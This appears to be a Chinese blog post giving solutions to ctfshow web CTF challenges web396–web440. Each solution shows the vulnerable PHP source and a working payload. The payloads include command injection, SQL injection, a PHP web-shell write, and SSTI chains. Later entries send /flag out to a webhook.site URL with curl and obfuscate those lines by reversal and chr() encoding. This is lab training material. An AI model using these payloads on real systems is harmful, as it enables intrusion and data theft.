@@ -1,0 +1,1231 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>[ctfshow]其他 | fallingskies</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://fallingskies22.github.io/favicon.ico?v=1724150366542">
+<link rel="stylesheet" href="https://fallingskies22.github.io/styles/main.css">
+
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
+  
+
+  
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="web396
+源码
+&lt;?php
+
+error_reporting(0);
+if(isset($_GET['url'])){
+    $url = parse_url($_GET['url']);
+    shell_exec('ech..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://fallingskies22.github.io">
+        <img src="https://fallingskies22.github.io/images/avatar.png?v=1724150366542" class="site-logo">
+        <h1 class="site-title">fallingskies</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/post/friends" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      <h3>想要去月球<h3>
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://fallingskies22.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">[ctfshow]其他</h2>
+            <div class="post-date">2024-07-02</div>
+            
+              <div class="feature-container" style="background-image: url('https://fallingskies22.github.io/post-images/ctfshowqi-ta.jpg')">
+              </div>
+            
+            <div class="post-content" v-pre>
+              <h2 id="web396">web396</h2>
+<p>源码</p>
+<pre><code class="language-php">&lt;?php
+
+error_reporting(0);
+if(isset($_GET['url'])){
+    $url = parse_url($_GET['url']);
+    shell_exec('echo '.$url['host'].'&gt; '.$url['path']);
+
+}else{
+    highlight_file(__FILE__);
+}
+</code></pre>
+<p>利用命令注入</p>
+<pre><code>?url=http://www.baidu.com/var/www/html/2;ls&gt;a
+?url=http://www.baidu.com/var/www/html/2;cat%20fl0g.php&gt;a
+</code></pre>
+<h2 id="web397">web397</h2>
+<p>源码</p>
+<pre><code class="language-php">&lt;?php
+
+error_reporting(0);
+if(isset($_GET['url'])){
+    $url = parse_url($_GET['url']);
+    shell_exec('echo '.$url['host'].'&gt; /tmp/'.$url['path']);
+
+}else{
+    highlight_file(__FILE__);
+}
+</code></pre>
+<p>命令注入，和上题相同</p>
+<pre><code>?url=http://www.baidu.com/2;cat%20fl0g.php&gt;a
+</code></pre>
+<h2 id="web398">web398</h2>
+<p>源码</p>
+<pre><code class="language-php">&lt;?php
+
+error_reporting(0);
+if(isset($_GET['url'])){
+    $url = parse_url($_GET['url']);
+    if(!preg_match('/;/', $url['host'])){
+        shell_exec('echo '.$url['host'].'&gt; /tmp/'.$url['path']);
+    }
+
+}else{
+    highlight_file(__FILE__);
+}
+</code></pre>
+<p>过滤掉了分号，使用&amp;&amp;进行绕过</p>
+<pre><code>/?url=http://www.baidu.com/2%26%26cat%20fl0g.php%3Ea
+</code></pre>
+<h2 id="web399">web399</h2>
+<p>源码</p>
+<pre><code class="language-php">&lt;?php
+
+error_reporting(0);
+if(isset($_GET['url'])){
+    $url = parse_url($_GET['url']);
+    if(!preg_match('/;|&gt;/', $url['host'])){
+        shell_exec('echo '.$url['host'].'&gt; /tmp/'.$url['path']);
+    }
+
+}else{
+    highlight_file(__FILE__);
+}
+</code></pre>
+<p>过滤了大于号，使用小于号继续绕过</p>
+<pre><code>/?url=http://www.baidu.com/2%26%26touch%20a&lt;cat%20fl0g.php
+</code></pre>
+<h2 id="web400">web400</h2>
+<p>源码</p>
+<pre><code class="language-php">&lt;?php
+
+error_reporting(0);
+if(isset($_GET['url'])){
+    $url = parse_url($_GET['url']);
+    if(!preg_match('/;|&gt;|http|https/i', $url['host'])){
+        shell_exec('echo '.$url['host'].'&gt; /tmp/'.$url['path']);
+    }
+
+}else{
+    highlight_file(__FILE__);
+}
+</code></pre>
+<p>才发现只对host做了过滤，path没有过滤🤣</p>
+<pre><code>/?url=http://www.baidu.com/2;cat%20fl0g.php&gt;a 
+</code></pre>
+<h2 id="web401">web401</h2>
+<p>源码</p>
+<pre><code class="language-php">&lt;?php
+
+#error_reporting(0);
+if(isset($_GET['url'])){
+    $url = parse_url($_GET['url']);
+    var_dump($url);
+    if(!preg_match('/;|&gt;|http|https|\|/i', $url['host'])){
+        shell_exec('echo '.$url['host'].'&gt; /tmp/'.$url['path']);
+    }
+
+}else{
+    highlight_file(__FILE__);
+}
+</code></pre>
+<pre><code>/?url=http://www.baidu.com/2;cat%20fl0g.php&gt;a 
+</code></pre>
+<h2 id="web402">web402</h2>
+<p>源码</p>
+<pre><code class="language-php">&lt;?php
+
+#error_reporting(0);
+if(isset($_GET['url'])){
+    $url = parse_url($_GET['url']);
+    var_dump($url);
+    if(preg_match('/http|https/i', $url['scheme'])){
+        die('error');
+    }
+    if(!preg_match('/;|&gt;|\||base/i', $url['host'])){
+        shell_exec('echo '.$url['host'].'&gt; /tmp/'.$url['path']);
+    }
+
+}else{
+    highlight_file(__FILE__);
+}
+</code></pre>
+<p>过滤了http和https协议，使用ftp协议。</p>
+<pre><code>/?url=ftp://www.baidu.com/2;cat%20fl0g.php&gt;a 
+</code></pre>
+<h2 id="web403">web403</h2>
+<p>源码</p>
+<pre><code class="language-php">&lt;?php
+
+error_reporting(0);
+if(isset($_GET['url'])){
+    $url = parse_url($_GET['url']);
+    if(preg_match('/^((2[0-4]\d|25[0-5]|[01]?\d\d?)\.){3}(2[0-4]\d|25[0-5]|[01]?\d\d?)$/', $url['host'])){
+        shell_exec('curl '.$url['scheme'].$url['host'].$url['path']);
+    }
+
+}else{
+    highlight_file(__FILE__);
+}
+</code></pre>
+<p>限制host必须为ip地址</p>
+<pre><code>/?url=http://1.1.1.1/2;cat%20fl0g.php&gt;a
+</code></pre>
+<h2 id="web404">web404</h2>
+<p>这里有个彩蛋，需要访问<code>404.php</code></p>
+<p>源码</p>
+<pre><code class="language-php">&lt;?php
+
+error_reporting(0);
+if(isset($_GET['url'])){
+    $url = parse_url($_GET['url']);
+    if(preg_match('/((2[0-4]\d|25[0-5]|[01]?\d\d?)\.){3}(2[0-4]\d|25[0-5]|[01]?\d\d?)./', $url['host'])){
+        if(preg_match('/^\/[A-Za-z0-9]+$/', $url['path'])){
+            shell_exec('curl '.$url['scheme'].$url['host'].$url['path']);
+        }
+    }
+
+}else{
+    highlight_file(__FILE__);
+}
+</code></pre>
+<p>path被限制了，使用host进行注入。</p>
+<pre><code>/404.php?url=http://1.1.1.1;cat%20fl0g.php%3Ea;/1
+</code></pre>
+<h2 id="web405">web405</h2>
+<p>源码</p>
+<pre><code class="language-php">&lt;?php
+
+error_reporting(0);
+if(isset($_GET['url'])){
+    $url = parse_url($_GET['url']);
+    if(preg_match('/((2[0-4]\d|25[0-5]|[01]?\d\d?)\.){3}(2[0-4]\d|25[0-5]|[01]?\d\d?)./', $url['host'])){
+        if(preg_match('/^\/[A-Za-z0-9]+$/', $url['path'])){
+            if(preg_match('/\~|\.|php/', $url['scheme'])){
+                shell_exec('curl '.$url['scheme'].$url['host'].$url['path']);
+            }
+            
+        }
+    }
+
+}else{
+    highlight_file(__FILE__);
+    echo 'parse_url 好强大';
+}
+</code></pre>
+<pre><code>/?url=php://1.1.1.1;cat%20fl0g.php&gt;a;/1
+</code></pre>
+<h2 id="web406">web406</h2>
+<p>源码</p>
+<pre><code class="language-php">&lt;?php
+
+require 'config.php';
+//flag in db
+highlight_file(__FILE__);
+$url=$_GET['url'];
+if(filter_var ($url,FILTER_VALIDATE_URL)){
+    $sql = &quot;select * from links where url ='{$url}'&quot;;
+    $result = $conn-&gt;query($sql);
+}else{
+    echo '不通过';
+}
+</code></pre>
+<p>这题是sql注入</p>
+<pre><code>?url=http://127.0.0.1/1%27union/**/select/**/1,flag/**/from/**/flag/**/into/**/outfile/**/%27/var/www/html/3.txt
+</code></pre>
+<h2 id="web407">web407</h2>
+<p>源码</p>
+<pre><code class="language-php">&lt;?php
+
+highlight_file(__FILE__);
+error_reporting(0);
+$ip=$_GET['ip'];
+
+if(filter_var ($ip,FILTER_VALIDATE_IP)){
+    call_user_func($ip);
+}
+
+class cafe{
+    public static function add(){
+        echo file_get_contents('flag.php');
+    }
+}
+
+</code></pre>
+<p>这里对ip地址校验，刚好call_user_func调用类函数的方式符合ipv6地址形式。</p>
+<pre><code>/?ip=cafe::add
+</code></pre>
+<h2 id="web408">web408</h2>
+<p>源码</p>
+<pre><code class="language-php">&lt;?php
+
+highlight_file(__FILE__);
+error_reporting(0);
+$email=$_GET['email'];
+
+if(filter_var ($email,FILTER_VALIDATE_EMAIL)){
+    file_put_contents(explode('@', $email)[1], explode('@', $email)[0]);
+}
+
+</code></pre>
+<p>利用file_put_contents写入shell</p>
+<pre><code>/?email=&quot;&lt;?=eval($_POST[1])?&gt;&quot;@shell.php
+</code></pre>
+<h2 id="web409">web409</h2>
+<p>源码</p>
+<pre><code class="language-php">&lt;?php
+
+highlight_file(__FILE__);
+error_reporting(0);
+$email=$_GET['email'];
+if(filter_var ($email,FILTER_VALIDATE_EMAIL)){
+    $email=preg_replace('/.flag/', '', $email);
+    eval($email);
+}
+
+</code></pre>
+<p>添加flag，当通过正则时，刚好能去除前面的双引号。</p>
+<pre><code>?email=&quot;flagsystem($_GET[1]);?&gt;&quot;@a.com&amp;1=cat%20/flag
+</code></pre>
+<h2 id="web410">web410</h2>
+<p>源码</p>
+<pre><code class="language-php">&lt;?php
+
+highlight_file(__FILE__);
+error_reporting(0);
+include('flag.php');
+$b=$_GET['b'];
+if(filter_var ($b,FILTER_VALIDATE_BOOLEAN)){
+    if($b=='true' || intval($b)&gt;0){
+        die('FLAG NOT HERE');
+    }else{
+        echo $flag;
+    }
+}
+</code></pre>
+<p>考察FILTER_VALIDATE_BOOLEAN</p>
+<p>如果是 &quot;1&quot;、&quot;true&quot;、&quot;on&quot; 和 &quot;yes&quot;，则返回 TRUE。<br>
+如果是 &quot;0&quot;、&quot;false&quot;、&quot;off&quot; 和 &quot;no&quot;，则返回 FALSE。<br>
+否则返回 NULL。</p>
+<pre><code>?b=yes
+</code></pre>
+<h2 id="web411">web411</h2>
+<p>源码</p>
+<pre><code class="language-php">&lt;?php
+
+highlight_file(__FILE__);
+error_reporting(0);
+include('flag.php');
+$b=$_GET['b'];
+if(filter_var ($b,FILTER_VALIDATE_BOOLEAN)){
+    if($b=='true' || intval($b)&gt;0 ||$b=='on' || $b=='ON'){
+        die('FLAG NOT HERE');
+    }else{
+        echo $flag;
+    }
+}
+</code></pre>
+<p>使用On或者yes都行</p>
+<h2 id="web412">web412</h2>
+<p>源码</p>
+<pre><code class="language-php">&lt;?php
+
+highlight_file(__FILE__);
+
+$ctfshow=$_POST['ctfshow'];
+
+if(isset($ctfshow)){
+    file_put_contents('flag.php', '//'.$ctfshow,FILE_APPEND);
+    include('flag.php');
+}
+
+</code></pre>
+<p>使用换行符<code>%0a</code>绕过注释符<code>//</code></p>
+<pre><code>ctfshow=%0asystem('cat flag.php');
+</code></pre>
+<h2 id="web413">web413</h2>
+<p>源码</p>
+<pre><code class="language-php">&lt;?php
+
+highlight_file(__FILE__);
+
+$ctfshow=$_POST['ctfshow'];
+
+if(isset($ctfshow)){
+        file_put_contents('flag.php', '/*'.$ctfshow.'*/',FILE_APPEND);
+    include('flag.php');
+}
+</code></pre>
+<p>另一种注释方式，使用闭合来绕过。</p>
+<pre><code>ctfshow=*/system('cat flag.php');/*
+</code></pre>
+<h2 id="web414">web414</h2>
+<p>源码</p>
+<pre><code class="language-php">&lt;?php
+
+
+highlight_file(__FILE__);
+include('flag.php');
+$ctfshow=$_GET['ctfshow'];
+
+if($ctfshow==true){
+    if(sqrt($ctfshow)&gt;=sqrt(intval($flag))){
+        echo 'FLAG_NOT_HERE';
+    }else{
+        echo $flag;
+    }
+}
+</code></pre>
+<p>sqrt函数当参数为负数时，返回NaN。</p>
+<p>在 PHP 中，当你尝试比较包含 NaN 的数值时，结果总是 false，因为 NaN 代表“不是数字”(Not-a-Number)。任何涉及 NaN 的操作，包括比较，都会返回 false 或者当作 false 来处理。</p>
+<pre><code>/?ctfshow=-1
+</code></pre>
+<h2 id="web415">web415</h2>
+<p>源码</p>
+<pre><code class="language-php">&lt;?php
+
+error_reporting(0);
+highlight_file(__FILE__);
+
+$k = $_GET[k];
+
+function getflag(){
+    echo file_get_contents('flag.php');
+}
+
+if($k=='getflag'){
+    die('FLAG_NOT_HERE');
+}else{
+    call_user_func($k);
+}
+</code></pre>
+<p>法一：php的函数名、类名不区分大小写，可通过大写来绕过。</p>
+<p>法二：利用命名空间</p>
+<p>如果没有定义任何命名空间，所有的类与函数的定义都是在全局空间，与 PHP 引入命名空间概念前一样。在名称前加上前缀\表示该名称是全局空间中的名称</p>
+<pre><code>?k=GETFLAG
+?k=\getflag
+</code></pre>
+<h2 id="web416">web416</h2>
+<p>源码</p>
+<pre><code class="language-php">&lt;?php
+
+error_reporting(0);
+highlight_file(__FILE__);
+
+class ctf{
+    public function getflag(){
+        return 'fake flag';
+    }
+    final public function flag(){
+        echo file_get_contents('flag.php');
+    }
+}
+
+class show extends ctf{
+    public function __construct($f){
+        call_user_func($f);
+    }
+}
+
+echo new show($_GET[f]);
+</code></pre>
+<p>调用类中函数。</p>
+<pre><code>/?f=ctf::flag
+</code></pre>
+<h2 id="web417">web417</h2>
+<p>源码</p>
+<pre><code class="language-php">&lt;?php /*ctfshow*/define('aPeKTP0126',__FILE__);$cIYMfW=urldecode(&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;);$CBhSfw=$cIYMfW[3].$cIYMfW[6].$cIYMfW[33].$cIYMfW[30];$xWoIVy=$cIYMfW[33].$cIYMfW[10].$cIYMfW[24].$cIYMfW[10].$cIYMfW[24];$RkEEuV=$xWoIVy[0].$cIYMfW[18].$cIYMfW[3].$xWoIVy[0].$xWoIVy[1].$cIYMfW[24];$YFfKrW=$cIYMfW[7].$cIYMfW[13];$CBhSfw.=$cIYMfW[22].$cIYMfW[36].$cIYMfW[29].$cIYMfW[26].$cIYMfW[30].$cIYMfW[32].$cIYMfW[35].$cIYMfW[26].$cIYMfW[30];eval($CBhSfw(&quot;JGpYanRLZD0ianBRRHVrYkd3eW5abWlWek1mc0pDb0hGTnJxSUJTaGRQQXhMT0tFZ1d0dlVUZVJYYVlsY1RjUkNadW5WbWpHVUtIZUlmT2RZWHNEa1NwTVFFaXR4TnJBbHphcXdQQmJKZ0Z2V295aExOQzltb0Ryd1VWZUtvUDVoYVh4YWl1dnRGaGZtZmdRMllqQXRKVmVsZWtybWZnUTJhZ2R1eWV2M1VHRWxOV2VqblZ2aHkyOXVVaXdIWWdVa2ZpSjNSaUoyZkhKanZISjJ2WEoyZmdKaFNKZmhTSXloU0lSbVlneTVmVHdoZnVSaFNJcmhTSXdoU0lKaFNJcWhTSXVoZnVxMllnVUNZZ0xqWWdVWFlneTBZZ3kzemlKMXZISjJTaUoyelhKMmZqSjNmakozU2pKMnZUUmhmdVFoU1R5SVNqSjJSaVFjemp2U0ozVVpnR3c5WVZrSngyVW1pMWRJV2k0dXlldjNVR0VsUElVeGxIdnRlRHhLTHFCbmZJU3hsSHZ0ZUR4S0xxQm5mSUV4emp2VG9rdkpGUGY5WVZrSngyVW1pMWRJZjEwWllWa0p4MlVtaTFkQWZrMFpZVmtKeDJVbWkxZGpTazBaWVZrSngyVW1pMWRBZmswWllWa0p4MlVtaTFkalNrMDdZREVYSkRrNHZUMHV5MnRKZURoVFBJRXhsSHZ0ZUR4S0xxQm5mZ3R4bEh2dGVEeEtMcUJuZjEwWllWU3Nla3Y1eTFkbVdpNHV5MnRKZURoVFBJa3hsSHZ0ZUR4S0xxQm5mVHZ4emp2Q2VHRUJlM1E5WVZrSngyVW1pMWQzV2k0dXlldjNVR0VsUElxSVdnZHVnZVMybnU1NGxUMHV5ZXYzVUdFbFBJUWpXaTR1eWV2M1VHRWxQSWYyV2k0dXlldjNVR0VsUElRNVdpNHV5ZXYzVUdFbFBJUTJXaTR1eWV2M1VHRWxQSWZtV2k0dXlldjNVR0VsUElmaldpNHV5ZXYzVUdFbFBJZjFXaTR1eWV2M1VHRWxQSVEyV2k0dXlldjNVR0VsUElmbVdnQmh4S2tkYVh2U0ozVVpnR3dzUXVjVm5EZWd2V0VCVURzbW9QZVBSdTFIZjA1QVVxZXVTa1VkVWtjV2lxWU15SlVQdmVKbW5xWWVvMDVOUEswQWllY1F2dVV1ZmhVY3l1dG9naGVQTERZdGVXdlJVUDVQUjFVRFVxQlRvMWNzeUsxMG9WU2RKaHR0blB3MXlJa21SaFNwU0pjUG5oWVJVSng0TGtTREpLNXZma2NRZUpKQXhlZUJmZXZUZWhVaVVreG9TaHhlRnFldW51WVZQaFVzb2hmbWlLaHVmVGhzVUp2ZHhWUkFSdWhVZnVVM2d1Um1vSjhqZVRZVWUzeGJpR3M0YTBjNVNWQkpldTRqeUtkMVNxQkNKS2N0dmhZZVVleFNuMGNRUnVTZWlxeTBKS2hHbzF4V1NKaGduZXNJZ3FTaXZrVVpSR3ZQZjBoQWdQaHBMMGNRUnVTZWlxeTBKS2hHbzF4V1NKaGduZXNJZ3FTaXZrVVpSR3ZQZjBoSWl1ZXplMlNEZmV0VG9QQklpdXRYUjFlUXZUdmlvUHhwZTFMMWllU0JQVFNmdnFrSWl1ZXplMlNEZmV0VG9QQm1pMVNwU2pRY2FnZC9OVG0vTFZ0bVFWdmhVS2haVWl3R0ZQdnRvMlUzZkNxalNITGR5ZUVoaTF2UmZDcWpTSHU3WXExc0ZreGhSVDExTEtBdVVQU2JVVkpzUUhKMnZncWhTMHFoU1RRaGZ1eWhTdVJoU1RxMVlnZUNZZ0wyWWdMMGZYSjJ6Z1E0WWdZcVlnTG1ZZ0w0WWdMMVlnTEFZZ0w1WWdZRVNISjJSakozZkhKMlJISjJTWEoyU0l1aFNKeWhTVEpoU1R3aFNUZmhTSWZoU0lMaFN1eTBZZ1lYWWd5MmZJTGhTdXFIYWdkdVUyMUhna3Z1Tml2U29EdFdVSlluZjEwWllxMXNGa3hoUmhkMldpNHVnUHQ0ZTJlWFBJZklXaTR1Z1B0NGUyZVhQSWZtV2dkdUZLZXFnVmNvTml2U29EdFdVSlluZklTeGxIdlNvRHRXVUpZbmZnRXhsSHZTb0R0V1VKWW5mVHZ4bEh2U29EdFdVSlluZmdFeGxIdlNvRHRXVUpZbmZUdnh6anZkaWVjREowdTlZRGNodnFBTVBoZG1XaTR1Z1B0NGUyZVhQSXE0V2k0dWdQdDRlMmVYUElTeGxIdjZVSnZmb2hjbmZrMFpZRGNodnFBTVBoZEFXaTR1Z1B0NGUyZVhQSVEwV2dkdXZHZUF5V2VvTml2U29EdFdVSlluUzEwWllxMXNGa3hoUmhkQWYxMDdZVnhCeXVBSlVYNDlZcTFzRmt4aFJoZGpmaDBaWXExc0ZreGhSaGRJU2gwWllxMXNGa3hoUmhkanplMFpZcTFzRmt4aFJoZGpTaDBaWXExc0ZreGhSaGRJZmswWllxMXNGa3hoUmhkSWZoMFpZcTFzRmt4aFJoZElTZTBaWXExc0ZreGhSaGRqU2gwWllxMXNGa3hoUmhkSWZrMDdVV1V0blh3dVUyMUhna3Z1YVhZYXZnZTN5aHhtaVBTSmZWaHZvMFUzZWVlNG9LZVBnSzVUbzNFMlB1ZWlma2hwVWtjdWYwNXNQS0FveWVlVmVoZUhvMWNJeWVVYUZWZXB4cXZIZTFVUnlKeG1Ta3hRZXU5dW8xVXl5Z0VzZ2hTUEp1dnRlSWtsVWV4b2Vra3lnaGt1dld2Z1BURXNpaGNQZWhjSHZ1eUlKSzVYZmV2V29rdEp2R0VNUHV0c1NLU2VpR1lUbmdoa0poSjFmaFJqaWh4SG5WdFF5UDFWeDFlTW5rVUh2UHZxZUNTVlJ1MVFMcUJvbmhZUnkxVW1MZWtlTGt2dXYydnNKMUo1b2VZcG5xMXVvMXMwVXFlVmdrdkJndVNnb0lrWEplZW1lVnZEVWtTSFBrWWtQZVVvZWVVa3hxOVVmMVlZZ2dZa2ZoaGVucVlpZTN2YWVLZDVGa3hCTHFZSGVoY015VEUwaUt2SlBLdFRlSjVYeVBCaXZrY0JMa3ZTdmhVQWVXY1huZVJBZ3V2b25XcjBVcVVQSlZlUUpLMXRuZ0UzVVAxVm5lVWtndTVnZUtSMEpJU1ZlZVJtVTNoVWZLQURKUEI0Z2VZWnZoZVduV3Z6VXFlVm9WU1BKVEV0b0llMnlUa2F4VnZrSkt0UG5rWUFQaEoxSnExRHZoeFNlMGNESjFlNFIyWURTZ1NXdjBVUVBnWWRpUFlaZWdZVWV1Y3NlaHhtdmVVQlVEa2Vua2NaeVBCaW5ra1dMcWV2RmhjUmVreGtmS2twSkdrSmYwVXR5UEJWeGtTeVVWNW9lSWVTZTF0YXllVVFKR2tKbmdoMnloZWRKcTFrUHVTdWZoY2xKUGQ1b2VTRGZEeGhuSlVCZXVlemllU2VGQ1lIaVZ3bUpleDRpa2g2UlRlaWZLOGpKMjFVU2VZa3hxY2lvM3cxZTJjUHZlU3FpV3hKZjBVWGdKdG1TaHhNb2tFVGVKc0lQSzVkUjA5V1B1OVNmSllTVWVlcFNlY3B4cWNKaWtjRFBLQlZlS2VwZmVjSmYwVUNlcXRvbnExcGVXdGlvMm1BVXFVRUZlWWRuVkFIbkttalVlZWR4aFVQUksxV3ZWdmd5aHRpUGVjeVUzeFd2Z3YzSklrdWYxeUFuVjlvZXE1TUpQQUVGcTFxVWtTSGUyQW1KS0FtUmh4RGVUdlN2VkF2Z2dyNWZrU3FnVGV0aURFTmUxSjVGa2tlRnExb2VxYzJQUDFWRmt1bWl1aGdlS3ZieTJBZXgyZWR2R2V1ZlBtMWdQNVRmMWVCZmdFZXZlYzFlQ1NpaWVjcGdLOVVmUHRWZXV4U0ZxOXlpdTVTZTA1aWVna29mMUpqZ2h2aGVWdmd5aHhwU0poTXhWQXVuSlVJaTBTVGwxRWN5M2VhdjJ2MFBQQjRlZWNDVTJCaG5lVWtlcXhteUpCQ0pHU2dlR0VRZWdFcG4wY2tTV3hIZTNFWXkxUzNvMVlaZUd0VVBrVXRpMmNZTHFBQ0pHU2dlR0VRZWdFcG4wY2tTV3hIZTNFWXkxUzNvMVlaZUd0VVBrVXRncVNpdjJ2eXZLdHVlSzltZ3FTaUwxU1BMcXRlZlZCYml1SjF4MllXTHFoVEozeDNncVNpdjJ2eXZLdHVlSzltaTFTcExxOTNOZzBIYWl1N05JND0iO2V2YWwoJz8+Jy4kQ0JoU2Z3KCR4V29JVnkoJFJrRUV1VigkalhqdEtkLCRZRmZLclcqMiksJFJrRUV1VigkalhqdEtkLCRZRmZLclcsJFlGZktyVyksJFJrRUV1VigkalhqdEtkLDAsJFlGZktyVykpKSk7&quot;));?&gt;
+</code></pre>
+<p>代码做了混淆，将eval改为echo来解混淆。<br>
+这里套了4层，主要是用字符串截取和base64来混淆。</p>
+<pre><code class="language-php">&lt;?php
+
+error_reporting(0);
+include('flag.php');
+$c=$_GET['ctf'];
+if($c=='show'){
+	echo $flag;
+}else{
+	echo 'FLAG_NOT_HERE';
+}
+</code></pre>
+<h2 id="web418">web418</h2>
+<p>源码</p>
+<pre><code class="language-php">&lt;?php
+
+$key= 0;
+$clear='clear.php';
+highlight_file(__FILE__);
+
+//获取参数
+$ctfshow=$_GET['ctfshow'];
+//包含清理脚本
+include($clear);
+
+extract($_POST);
+if($key===0x36d){
+    //帮黑阔写好后门
+    eval('&lt;?php '.$ctfshow.'?&gt;');
+}else{
+    $die?die('FLAG_NOT_HERE'):clear($clear);
+}
+
+function clear($log){
+    shell_exec('rm -rf '.$log);
+}
+</code></pre>
+<p><code>extract</code>函数处可以利用变量覆盖，但是上传<code>key</code>参数类型始终为string，无法通过判断。<br>
+在else处进行变量覆盖+命令注入。</p>
+<pre><code>die=0&amp;clear=;cat flag.php &gt; 1.txt;
+</code></pre>
+<h2 id="web419">web419</h2>
+<p>源码</p>
+<pre><code class="language-php">&lt;?php
+
+highlight_file(__FILE__);
+
+
+$code = $_POST['code'];
+if(strlen($code) &lt; 17){
+    eval($code);
+}
+</code></pre>
+<p>代码执行，且限制长度。</p>
+<pre><code>code=system('cat *');
+</code></pre>
+<h2 id="web420">web420</h2>
+<p>源码</p>
+<pre><code class="language-php">&lt;?php
+
+highlight_file(__FILE__);
+
+$code = $_POST['code'];
+if(strlen($code) &lt; 8){
+    system($code);
+}
+</code></pre>
+<p>命令执行，且限制长度。</p>
+<pre><code>code=nl ../*
+</code></pre>
+<h2 id="web421">web421</h2>
+<p>源码</p>
+<pre><code class="language-php">&lt;?php
+
+highlight_file(__FILE__);
+
+$code = $_POST['code'];
+if(strlen($code) &lt; 6){
+    system($code);
+}
+</code></pre>
+<p>命令执行，且限制长度。</p>
+<pre><code>code=cat *
+</code></pre>
+<h2 id="web422">web422</h2>
+<p>源码</p>
+<pre><code class="language-php">&lt;?php
+
+highlight_file(__FILE__);
+
+$code = $_POST['code'];
+if(strlen($code) &lt; 5){
+    system($code);
+}
+</code></pre>
+<p>命令执行，且限制长度。</p>
+<pre><code>code=nl *
+</code></pre>
+<h2 id="web423">web423</h2>
+<p>这题是SSTI，没有提示。。。</p>
+<pre><code>?code=&quot;&quot;.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[%27popen%27](&quot;env&quot;).read()
+</code></pre>
+<h2 id="web424">web424</h2>
+<h2 id="web425">web425</h2>
+<h2 id="web426">web426</h2>
+<h2 id="web427">web427</h2>
+<h2 id="web428">web428</h2>
+<h2 id="web429">web429</h2>
+<h2 id="web430">web430</h2>
+<h2 id="web431">web431</h2>
+<p>同上题</p>
+<h2 id="web432">web432</h2>
+<h2 id="web433">web433</h2>
+<p>过滤了open、read字符。<br>
+使用字符串拼接绕过open，使用带外绕过read。</p>
+<pre><code>?code=&quot;&quot;.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[%27po%27+%27pen%27](&quot;curl%20https://webhook.site/6269820b-2105-4458-b6de-b05302d209ba/?flag=`cat%20/flag`&quot;)
+</code></pre>
+<h2 id="web434">web434</h2>
+<p>curl也被过滤了<br>
+使用字符串拼接绕过。</p>
+<pre><code>?code=&quot;&quot;.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[%27po%27+%27pen%27](&quot;cu&quot;+&quot;rl%20https://webhook.site/6269820b-2105-4458-b6de-b05302d209ba/?flag=`cat%20/flag`&quot;)
+</code></pre>
+<h2 id="web435">web435</h2>
+<h2 id="web436">web436</h2>
+<h2 id="web437">web437</h2>
+<h2 id="web438">web438</h2>
+<h2 id="web439">web439</h2>
+<p>下划线也过滤了。</p>
+<p>但可以使用exec函数执行多行代码。</p>
+<p>将代码逆序。</p>
+<pre><code class="language-py">a = 'import os;os.system(&quot;curl https://webhook.site/6269820b-2105-4458-b6de-b05302d209ba/?flag=`cat /flag`&quot;)'
+
+print(a[::-1])
+</code></pre>
+<p>输出要求为str类型，不然会报错，所以这里使用str函数，使返回值为str。</p>
+<pre><code>?code=str(exec(%27)&quot;`galf/%20tac`=galf?/ab902d20350b-ed6b-8544-5012-b0289626/etis.koohbew//:sptth%20lruc&quot;(metsys.so;so%20tropmi%27[::-1]))
+</code></pre>
+<h2 id="web440">web440</h2>
+<p>过滤了单引号和双引号</p>
+<p>使用chr函数来绕过。</p>
+<pre><code class="language-py">a = 'import os;os.system(&quot;curl https://webhook.site/6269820b-2105-4458-b6de-b05302d209ba/?flag=`cat /flag`&quot;)'
+
+def chr2chr(a):
+    t=''
+    for i in range(len(a)):
+        if i &lt; len(a)-1:
+            t+='chr('+str(ord(a[i]))+')%2b'
+        else:
+            t+='chr('+str(ord(a[i]))+')'
+
+    return t
+
+
+print(chr2chr(a))
+</code></pre>
